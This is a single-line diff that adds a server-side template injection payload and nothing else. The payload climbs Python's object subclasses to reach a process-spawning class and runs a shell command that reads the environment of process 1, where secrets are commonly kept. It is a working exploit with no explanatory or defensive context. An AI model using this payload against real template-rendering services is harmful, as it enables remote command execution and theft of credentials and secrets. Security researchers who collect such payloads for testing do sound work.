@@ -1,0 +1,1 @@
+{{[].__class__.__base__.__subclasses__()[351]('cat /proc/1/en*',shell=True,stdout=-1).communicate()[0].strip()}}
